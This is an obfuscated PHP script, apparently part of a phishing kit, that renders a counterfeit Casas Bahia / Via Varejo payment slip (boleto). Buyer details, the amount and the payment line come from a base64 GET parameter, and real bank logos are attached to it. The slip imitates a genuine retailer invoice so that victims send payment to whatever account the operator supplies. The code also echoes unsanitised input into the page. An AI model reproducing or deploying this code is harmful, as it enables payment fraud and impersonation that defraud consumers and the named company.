<?php /*
Casas Bahia v1.0
*/
$hrequcqcn = "resBanco";
$GLOBALS["yjdngqutul"] = "resBanco";
$cjmhtyuhp = "dados";
$GLOBALS["iggxkrcd"] = "resBanco";
$GLOBALS["yulsiaup"] = "dados";
$gbmfuyj = "dados";
$GLOBALS["ugwxjvwggis"] = "d3";
$GLOBALS["dodikit"] = "dados";
$pchrqphp = "resBanco";
$GLOBALS["egbptvpx"] = "barras";
$ovquunwwl = "resBanco";
$GLOBALS["cjmmoguxvn"] = "b";
$GLOBALS["qlawknxvw"] = "resBanco";
$GLOBALS["cuhskyco"] = "resBanco";
$GLOBALS["htrlpumx"] = "resBanco";
$GLOBALS["kdoqtssnq"] = "resBanco";
$GLOBALS["yligbrgqg"] = "dados";
$oiqbpey = "b";
$sjdubbeqysp = "resBanco";
$kuwvkgl = "resBanco";
$
{
    $oiqbpey
} = $_GET["b"];
$vgmqnekhce = "resBanco";
$GLOBALS["suxqyxbwm"] = "resBanco";
$srpwxc = "dados";
$GLOBALS["pvkhcldumkn"] = "resBanco";
$yannbqomweo = "resBanco";
$GLOBALS["rkwdwikclzx"] = "dados";
$GLOBALS["dyqwilgwdh"] = "resBanco";
$
{
    $GLOBALS["cjmmoguxvn"]
} = base64_decode($
{
    $GLOBALS["cjmmoguxvn"]
});
$oqdeethn = "resBanco";
$
{
    $GLOBALS["yligbrgqg"]
} = json_decode($
{
    $GLOBALS["cjmmoguxvn"]
}
, true);
$wojmrprpcib = "resBanco";
$fvfndvunqlp = "resBanco";
require __DIR__ . "/lib/boletosPHP.php";
$GLOBALS["vudsjdwyp"] = "resBanco";
$ynedwb = "resBanco";
if (!isset($
{
    $srpwxc
}
["linha"]))
{
    echo "error 404";
    exit();
}
$jtyardmv = "resBanco";
$
{
    $GLOBALS["egbptvpx"]
} = new boletosPHP();
$barras->setIpte($
{
    $GLOBALS["rkwdwikclzx"]
}
["linha"]);
$sylyyzdfxn = "resBanco";
$nzhzlpowldm = "resBanco";
$
{
    $GLOBALS["ugwxjvwggis"]
} = substr($
{
    $GLOBALS["yulsiaup"]
}
["linha"], 0, 3);
switch ($
{
        $GLOBALS["ugwxjvwggis"]
})
{
    case "121";
    $
    {
            $GLOBALS["htrlpumx"]
    }
    ["digitos"] = "121-0";
    $
    {
            $sjdubbeqysp
    }
    ["nome"] = "Agi Bank";
    $
    {
            $GLOBALS["kdoqtssnq"]
    }
    ["banco"] = "agibank";
break;
case "033";
$
{
        $GLOBALS["iggxkrcd"]
}
["digitos"] = "033-7";
$
{
        $GLOBALS["iggxkrcd"]
}
["nome"] = "Santander";
$
{
        $ovquunwwl
}
["banco"] = "santander";
break;
case "212";
$
{
        $GLOBALS["yjdngqutul"]
}
["digitos"] = "212";
$
{
        $fvfndvunqlp
}
["nome"] = "Original";
$
{
        $GLOBALS["iggxkrcd"]
}
["banco"] = "original";
break;
case "655";
$
{
        $GLOBALS["iggxkrcd"]
}
["digitos"] = "655";
$
{
        $sylyyzdfxn
}
["nome"] = "Neon";
$
{
        $wojmrprpcib
}
["banco"] = "neon";
break;
case "422";
$
{
        $GLOBALS["dyqwilgwdh"]
}
["digitos"] = "422-7";
$
{
        $jtyardmv
}
["nome"] = "Safra";
$
{
        $GLOBALS["iggxkrcd"]
}
["banco"] = "safra";
break;
case "237";
$
{
        $GLOBALS["qlawknxvw"]
}
["digitos"] = "237-2";
$
{
        $pchrqphp
}
["nome"] = "Bradesco";
$
{
        $GLOBALS["suxqyxbwm"]
}
["banco"] = "bradesco";
break;
case "341";
$
{
        $GLOBALS["iggxkrcd"]
}
["digitos"] = "341-7";
$
{
        $GLOBALS["iggxkrcd"]
}
["nome"] = "Itaú S/A";
$
{
        $nzhzlpowldm
}
["banco"] = "itau";
break;
case "001";
$
{
        $GLOBALS["iggxkrcd"]
}
["digitos"] = "001-9";
$
{
        $vgmqnekhce
}
["nome"] = "Banco do Brasil";
$
{
        $hrequcqcn
}
["banco"] = "bancodobrasil";
break;
case "104";
$
{
        $GLOBALS["iggxkrcd"]
}
["digitos"] = "104-0";
$
{
        $GLOBALS["iggxkrcd"]
}
["nome"] = "Caixa Econômica Federal";
$
{
        $GLOBALS["pvkhcldumkn"]
}
["banco"] = "caixa";
break;
case "077";
$
{
        $oqdeethn
}
["digitos"] = "077-9";
$
{
        $GLOBALS["iggxkrcd"]
}
["nome"] = "Banco Inter";
$
{
        $GLOBALS["vudsjdwyp"]
}
["banco"] = "inter";
break;
case "756";
$
{
        $GLOBALS["iggxkrcd"]
}
["digitos"] = "756";
$
{
        $GLOBALS["iggxkrcd"]
}
["nome"] = "Sicoob";
$
{
        $GLOBALS["iggxkrcd"]
}
["banco"] = "sicoob";
break;
default;
$
{
        $GLOBALS["iggxkrcd"]
}
["digitos"] = $
{
        $GLOBALS["ugwxjvwggis"]
};
$
{
        $GLOBALS["cuhskyco"]
}
["nome"] = "Casas Bahia";
$
{
        $kuwvkgl
}
["banco"] = "casasbahia";
break;
}
echo "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>A maior loja, os menores preços.</title>\n</head>\n<style>\n    body{\n        font-size: 10px;\n        font-family: Arial, Helvetica, Verdana, sans-serif;\n    }\n\n    #cot{\n        padding: 6px 5px;\n    }\n.Estilo1 {\n\tfont-size: 13px;\n\tfont-weight: bold;\n}\n</style>\n<body style=\"width: 100%; max-width: 750px; margin: 0 auto;\">\n\n<div style=\"font-size: 20px; padding-bottom: 30px; margin-left: 120px;\">Boleto ";
echo $
{
    $ynedwb
}
["nome"];
echo "</div>\n\n<hr style=\"background: #e5e5e5; height: 1px; border: none;\">\n\n<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\n    <tr>\n        <td colspan=\"4\">\n\n            <table width=\"100%\" border=\"0\" style=\"border-bottom: 6px solid #000000;\">\n            <tr>\n                <td width=\"27%\"><img src=\"img/";
echo $
{
    $GLOBALS["iggxkrcd"]
}
["banco"];
$GLOBALS["uqzhynhryp"] = "dados";
echo ".png\" alt=\"\"></td>\n                <td width=\"29%\" valign=\"bottom\" style=\"font-size: 25px; font-weight: bolder;\">";
echo $
{
    $GLOBALS["iggxkrcd"]
}
["digitos"];
echo "</td>\n              <td width=\"44%\" valign=\"bottom\" style=\"font-size: 15px; font-weight: bolder;\"><div align=\"right\">RECIBO DO PAGADOR </div></td>\n            </tr>\n\n        </table>\n        </td>\n    </tr>\n    <tr>\n        <td style=\"border-bottom: 1px solid #000000;border-right: 1px solid #000000\">\n            <div id=\"cot\">\n                Beneficiário:<br />\n                <b>Casas Bahia</b><br /> <br />\n                VIA VAREJO S/A<br />\n                CNPJ: 33.041.260/0652-90<br />\n                R JOAO PESSOA, 83<br />\n                Centro<br />\n                São Caetano do Sul-SP\n            </div>\n        </td>\n        <td valign=\"top\" style=\"border-bottom: 1px solid #000000;border-right: 1px solid #000000\" id=\"cot\">Agência/Cod.Beneficiário:</td>\n        <td valign=\"top\" style=\"border-bottom: 1px solid #000000;border-right: 1px solid #000000\" id=\"cot\">\n            Data de Emissão:<br />\n            <b><div style=\"margin-top: 6px;\">";
echo ucwords($
{
    $GLOBALS["yulsiaup"]
}
["data"]);
echo "</div></b>\t</td>\n        <td id=\"cot\" valign=\"top\" style=\"border-bottom: 1px solid #000000\">\n            <div align=\"left\">Data de Vencimento<br />\n                <b>\n                    <div style=\"text-align: right; margin-top: 6px;\">";
echo ucwords($
{
    $GLOBALS["yulsiaup"]
}
["vencimento"]);
echo "</div>\n                </b> </div></td>\n    </tr>\n    <tr>\n        <td id=\"cot\" style=\"border-bottom: 1px solid #000000;border-right: 1px solid #000000\">Pagador:<br />\n            <b><div style=\"margin-top: 6px;\">";
echo ucwords($
{
    $GLOBALS["yulsiaup"]
}
["sacado"]);
echo "</div></b></td>\n        <td id=\"cot\" style=\"border-bottom: 1px solid #000000;border-right: 1px solid #000000\">Nosso Número:<br />\n            <b><div style=\"margin-top: 6px;\">26/00.802.052.463-3</div></b></td>\n        <td id=\"cot\" style=\"border-bottom: 1px solid #000000;border-right: 1px solid #000000\">Número Documento:<br />\n            <b><div style=\"margin-top: 6px;\">";
echo $
{
    $GLOBALS["dodikit"]
}
["pedido"];
$GLOBALS["txxyssby"] = "dados";
echo "</div></b></td>\n        <td id=\"cot\" style=\"border-bottom: 1px solid #000000\">\n            Valor Documento<br />\n            <b>\n                <div style=\"text-align: right; margin-top: 6px;\">R\$ ";
echo $
{
    $GLOBALS["yulsiaup"]
}
["valor"];
echo "</div>\n            </b></td>\n    </tr>\n    <tr>\n        <td id=\"cot\" colspan=\"4\" style=\"border-bottom: 1px solid #000000; line-height: 16px;\">\n            Referência:<br />\n            <b>\n                Compras efetuadas através do Comércio Eletrônico.<br />\n                Estabelecimento: CASASBAHIA.COM.BR / Referência do Pedido: ";
echo $
{
    $GLOBALS["yulsiaup"]
}
["pedido"];
echo "            </b>\n        </td>\n    </tr>\n</table>\n\n<table width=\"100%\" border=\"0\">\n  <tr>\n    <td width=\"76%\">&nbsp;</td>\n    <td width=\"24%\" style=\"padding: 6px 0\"><span class=\"Estilo1\">Autenticação Mecanica</span></td>\n  </tr>\n</table>\n<img src=\"img/separacao.png\" alt=\"\">\n<br><br>\n\n<table width=\"100%\" border=\"0\" style=\"border-bottom: 6px solid #000000;\">\n  <tr>\n    <td width=\"27%\"><img src=\"img/";
echo $
{
    $yannbqomweo
}
["banco"];
echo ".png\"></td>\n    <td width=\"15%\" valign=\"bottom\" style=\"font-size: 25px; font-weight: bolder;\">";
echo $
{
    $GLOBALS["iggxkrcd"]
}
["digitos"];
echo "</td>\n    <td width=\"58%\" valign=\"bottom\"><div align=\"right\" style=\"font-weight: bold; font-size: 14px;\">\n            ";
echo $
{
    $GLOBALS["yulsiaup"]
}
["linha"];
echo "        </div></td>\n  </tr>\n</table>\n\n<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n  <tr>\n    <td style=\"border-bottom: 1px solid #000000;border-left: 1px solid #000000;\" width=\"17%\" id=\"cot\">Local de Pagamento</td>\n    <td style=\"border-bottom: 1px solid #000000; border-right: 1px solid #000000;\" width=\"56%\" id=\"cot\"><b>\n        Pagável em qualquer Banco até o vencimento.    </td>\n    <td style=\"border-bottom: 1px solid #000000;border-right: 1px solid #000000;\" width=\"27%\" id=\"cot\">Data de Vencimento\n        <div style=\"text-align: right\"><b>";
echo $
{
    $GLOBALS["uqzhynhryp"]
}
["vencimento"];
echo "</b></div>\t</td>\n  </tr>\n  <tr>\n    <td style=\"border-bottom: 1px solid #000000;border-left: 1px solid #000000; border-right: 1px solid #000000;\" colspan=\"2\" id=\"cot\">\n\tBeneficiário:<br>\n\t<b>Casas Bahia</b><br><br>\n    VIA VAREJO S/A<br>\n    CNPJ: 33.041.260/0652-90<br>\n    Voluntários da Franca, 1465<br>\n    Centro<br>\n    Franca-SP\n    </td>\n    <td style=\"border-bottom: 1px solid #000000;border-right: 1px solid #000000;\" valign=\"top\" id=\"cot\">Agência / Código do Beneficiário</td>\n  </tr>\n  <tr>\n    <td colspan=\"2\"><table width=\"100%\" border=\"0\" style=\"line-height: 16px;\" cellspacing=\"0\" cellpadding=\"0\">\n      <tr>\n        <td style=\"border-right: 1px solid #000000; padding: 1px 7px; border-bottom: 1px solid #000000;border-left: 1px solid #000000;\">Data Documento\n            <div style=\"text-align: center\"><b>";
echo $
{
    $gbmfuyj
}
["data"];
echo "</b></div>        </td>\n        <td style=\"border-right: 1px solid #000000; padding: 1px 7px; border-bottom: 1px solid #000000;\">N Documento\n            <div style=\"text-align: center\"><b>";
echo $
{
    $GLOBALS["txxyssby"]
}
["pedido"];
echo "</b></div>        </td>\n        <td style=\"border-right: 1px solid #000000; padding: 1px 7px; border-bottom: 1px solid #000000;\">Espécie Doc\n            <div style=\"text-align: center\"><b>Outro</b></div>        </td>\n        <td style=\"border-right: 1px solid #000000; padding: 1px 7px; border-bottom: 1px solid #000000;\">Aceite\n            <div style=\"text-align: center; \"><b>N</b></div>        </td>\n        <td style=\"border-bottom: 1px solid #000000; border-right: 1px solid #000000;\"> &nbsp; Data Processamento\n            <div style=\"text-align: center\"><b>";
echo $
{
    $GLOBALS["yulsiaup"]
}
["data"];
echo "</b></div>        </td>\n      </tr>\n    </table></td>\n    <td style=\"border-bottom: 1px solid #000000;padding: 0 5px;border-right: 1px solid #000000;\">Nosso Número\n        <div style=\"text-align: right; margin-top: 4px;\"><b>26/00.802.052.463-3</b></div>        </td>\n    </td>\n  </tr>\n\n  <tr>\n    <td colspan=\"2\"><table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n      <tr>\n        <td valign=\"top\" style=\"border-right: 1px solid #000000; padding: 6px 7px;border-bottom: 1px solid #000000;border-left: 1px solid #000000;\">Uso do Banco</td>\n        <td style=\"border-right: 1px solid #000000; padding: 6px 7px;border-bottom: 1px solid #000000;\">Cip\n            <div style=\"text-align: center; margin-top: 4px;\" ><b>865</b></div>        </td>\n        <td style=\"border-right: 1px solid #000000; padding: 6px 7px;border-bottom: 1px solid #000000;\">Carteira\n            <div style=\"text-align: center; margin-top: 4px;\"><b>26</b></div>        </td>\n        <td style=\"border-right: 1px solid #000000; padding: 6px 7px;border-bottom: 1px solid #000000;\">Espécie Moeda\n            <div style=\"text-align: center; margin-top: 4px;\"><b>Real</b></div>        </td>\n        <td valign=\"top\" style=\"border-right: 1px solid #000000; padding: 6px 7px;border-bottom: 1px solid #000000;\">Quantidade</td>\n        <td valign=\"top\" style=\"padding: 6px 7px;border-bottom: 1px solid #000000; border-right: 1px solid #000000;\">Valor</td>\n      </tr>\n    </table></td>\n    <td style=\"border-bottom: 1px solid #000000; padding: 0 5px; border-right: 1px solid #000000;\">Valor do Documento\n        <div style=\"text-align: right; margin-top: 4px;\"><b>R\$ ";
echo $
{
    $GLOBALS["yulsiaup"]
}
["valor"];
echo "</b></div>    </td>\n  </tr>\n\n  <tr>\n    <td style=\"border-bottom: 1px solid #000000; border-right: 1px solid #000000;border-left: 1px solid #000000; line-height: 12px; \" colspan=\"2\" id=\"cot\">\n        <b>Instruções (Texto de responsabilidade do beneficiário)</b> <br>\n        PAGAR O BOLETO ATÉ O VENCIMENTO.<br>\n        Informamos que o pedido somente será liberado, caso<br>\n        pagamento seja feito em uma ÚNICA parcela, referente ao<br>\n        valor INTEGRAL do titulo.<br>\n        NÃO ACEITAR PAGAMENTO EM CHEQUE    <br><br><br><br><br><br><br></td>\n    <td style=\"border-bottom: 1px solid #000000;border-right: 1px solid #000000; line-height: 12px;\" valign=\"top\" id=\"cot\">\n        (-) Desconto/Abatimento<br>\n        (-) Outras Deduções  <br>\n        (+) Mora/Multa   <br>\n        (+) Outros Acréscimos <br>\n        (+) Valor Cobrado    </td>\n  </tr>\n  <tr>\n    <td colspan=\"2\" valign=\"top\" id=\"cot\" style=\"border-bottom: 1px solid #000000; border-right: 1px solid #000000;border-left: 1px solid #000000;\"><table width=\"100%%\" cellspacing=\"0\" cellpadding=\"0\">\n      <tr>\n        <td width=\"9%\" valign=\"top\">Pagador : </td>\n        <td width=\"91%\" style=\"line-height: 12px;\">\n            ";
echo ucwords($
{
    $cjmhtyuhp
}
["sacado"]);
echo "            <br>\n            ";
echo ucwords($
{
    $GLOBALS["yulsiaup"]
}
["endereco"]);
echo ", ";
echo ucwords($
{
    $GLOBALS["yulsiaup"]
}
["numero"]);
echo " <br>\n            ";
echo ucwords($
{
    $GLOBALS["yulsiaup"]
}
["cep"]);
echo " ";
echo ucwords($
{
    $GLOBALS["yulsiaup"]
}
["cidade"]);
echo " - ";
echo strtoupper($
{
    $GLOBALS["yulsiaup"]
}
["estado"]);
echo " <br>\nSacador/Avalista: CASASBAHIA.COM.BR <br><br><br></td>\n      </tr>\n    </table></td>\n    <td style=\"border-bottom: 1px solid #000000;border-right: 1px solid #000000;\" align=\"center\">Ficha de Compensação</td>\n  </tr>\n</table>\n\n<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n  <tr>\n    <td style=\"padding-top: 15px;\" width=\"73%\">\n        ";
$barras->desenhaBarras();
echo "    </td>\n    <td id=\"cot\" width=\"27%\"><div align=\"center\" style=\"font-size: 12px; font-weight: bold;\">Autenticação Mecânica</div></td>\n  </tr>\n</table>\n\n</body>\n</html>\n";
?>
